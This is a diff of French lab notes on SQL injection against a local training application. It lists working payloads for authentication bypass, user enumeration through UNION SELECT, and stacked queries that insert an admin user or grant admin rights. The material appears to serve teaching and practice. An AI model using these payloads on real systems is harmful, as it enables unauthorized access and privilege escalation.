@@ -41,19 +41,29 @@ http://127.0.0.8:8000
 
 # Injections SQL possibles
 
+> Pour avoir un aperçu des requêtes, utilisez https://www.db-fiddle.com/
+
 ## Authentification sans mot de passe
 
 `' or 1=1 -- `
 
 > Ne pas oublier l'espace à la fin
 
+---
+
 ## Enumération des utilisateurs
 
 `' or 1=1 UNION SELECT * FROM users -- `
 
+> UNION SELECT permet de combiner le résultat de deux requêtes
+
+---
+
 ## Insertion d'un utilisateur dans la table users
 
-`' or 1=1 UNION SELECT 'admin', 'admin', 'admin', 'admin' -- `
+`'; INSERT INTO users (username, password, email, admin) values ('pirate2', 'pirate', 'user@gmail.com', 'true'); -- `
+'; UPDATE users set admin = 'true' WHERE username = 'user2'; --
+> Deux requêtes dans le même payload!
 
 # SQLMap
 
